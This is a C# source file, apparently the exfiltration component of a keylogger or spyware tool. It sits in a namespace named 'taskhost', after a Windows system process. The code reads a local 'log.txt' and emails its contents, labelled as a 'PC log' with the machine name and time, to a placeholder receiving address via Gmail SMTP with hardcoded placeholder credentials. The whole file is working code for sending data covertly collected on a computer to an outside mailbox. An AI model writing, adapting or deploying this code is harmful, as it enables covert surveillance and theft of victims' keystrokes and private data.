using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Mail;

namespace taskhost
{
    class Email
    {
        private static string email = "SeuEmail@gmail.com";
        private static string pass = "SuaSenha";
        private static string receber = "EmailReceber@gmail.com";

        public void enviar()
        {
            string msg = pegaMSG();
            MailMessage mail = new MailMessage();
            DateTime agora = DateTime.Now;
           
            string assunto = "LOG DO PC: " + System.Windows.Forms.SystemInformation.ComputerName + " DATA: " + agora.ToString("dd/MM/yyyy HH:mm");
            
            mail.From = new MailAddress(email);
            mail.To.Add(receber); // para
            mail.Subject = assunto; // assunto
            mail.Body = msg; // mensagem

            using (var smtp = new SmtpClient("smtp.gmail.com" ))
            {
                smtp.EnableSsl = true; // GMail requer SSL
                smtp.Port = 587; 
                smtp.DeliveryMethod = SmtpDeliveryMethod.Network; // modo de envio
                smtp.UseDefaultCredentials = false; // vamos utilizar credencias especificas

                // seu usuário e senha para autenticação
                smtp.Credentials = new NetworkCredential(email, pass);

                // envia o e-mail
                smtp.Send(mail);
            }
        }
        private static string pegaMSG()
        {
            string msg;
            msg = System.IO.File.ReadAllText(@"log.txt");
            return msg;
        }

    }
}
